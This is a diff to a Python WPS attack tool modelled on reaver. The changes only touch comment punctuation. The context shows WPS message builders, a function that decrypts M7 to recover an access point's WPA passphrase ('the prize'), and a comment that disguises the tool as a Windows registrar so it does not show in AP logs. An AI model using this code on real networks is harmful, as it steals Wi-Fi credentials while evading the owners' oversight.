@@ -15,7 +15,7 @@ Framing (reaver ``src/builder.c``; struct layouts ``defs.h``):
     WSC      : 2-byte BE attr id │ 2-byte BE len │ value …
 
 A WSC "message" (what the Authenticator HMACs as M_prev/M_curr) is the WSC TLV
-byte string only — Version TLV onward, excluding the EAP/WFA headers.
+byte string only: Version TLV onward, excluding the EAP/WFA headers.
 """
 
 from __future__ import annotations
@@ -121,7 +121,7 @@ ENROLLEE_IDENTITY = b"WFA-SimpleConfig-Enrollee-1-0"
 # ---- Registrar device descriptor -------------------------------------------
 # These TLVs are cosmetic to the protocol (APs don't validate them) but they
 # ARE visible to the AP and surface in its WPS logs / admin UI as "the device
-# that paired". So they MUST NOT fingerprint the tool — we impersonate a generic
+# that paired". So they MUST NOT fingerprint the tool. We impersonate a generic
 # Windows registrar (Manufacturer "Microsoft" / Model "Windows", a Computer/PC
 # primary device type), exactly the blend reaver uses, because a Windows machine
 # doing WPS is the most ordinary thing on the air. NEVER advertise "wifit3" here.
@@ -180,7 +180,7 @@ def _device_attrs() -> bytes:
 
 
 # ---------------------------------------------------------------------------
-# Registrar message builders — return WSC attribute bytes (Version TLV onward)
+# Registrar message builders: return WSC attribute bytes (Version TLV onward)
 # ---------------------------------------------------------------------------
 def _version_and_type(msg_type: int) -> bytes:
     return tlv_u8(ATTR_VERSION, WPS_VERSION) + tlv_u8(ATTR_MSG_TYPE, msg_type)
@@ -290,7 +290,7 @@ def build_wsc_nack(nonce_e: bytes, nonce_r: bytes, config_error: int = 0) -> byt
 # ---------------------------------------------------------------------------
 def build_m1(uuid_e: bytes, mac_e: bytes, nonce_e: bytes, pke: bytes,
              dev_pw_id: int = DEV_PW_PUSHBUTTON) -> bytes:
-    """M1 (hostapd wps_build_m1 order). No Authenticator — keys don't exist yet."""
+    """M1 (hostapd wps_build_m1 order). No Authenticator: keys don't exist yet."""
     return (
         _version_and_type(WPS_M1)
         + tlv(ATTR_UUID_E, uuid_e)
@@ -380,7 +380,7 @@ def extract_m8_credentials(
 
 
 # ---------------------------------------------------------------------------
-# EAP / 802.1X framing — return the 802.1X payload (after LLC/SNAP)
+# EAP / 802.1X framing: return the 802.1X payload (after LLC/SNAP)
 # ---------------------------------------------------------------------------
 def eapol_start() -> bytes:
     return struct.pack(">BBH", DOT1X_VERSION, DOT1X_TYPE_EAPOL_START, 0)
@@ -503,7 +503,7 @@ def extract_m7_credentials(
     """Decrypt M7's Encrypted Settings (AP's config) → flat AP-settings TLVs.
 
     Returns {ssid, network_key, ...} or None if decryption is malformed.
-    The Network Key is the WPA passphrase/PSK — the prize.
+    The Network Key is the WPA passphrase/PSK: the prize.
     """
     if len(encr_settings_value) < 32 or len(encr_settings_value) % 16:
         return None
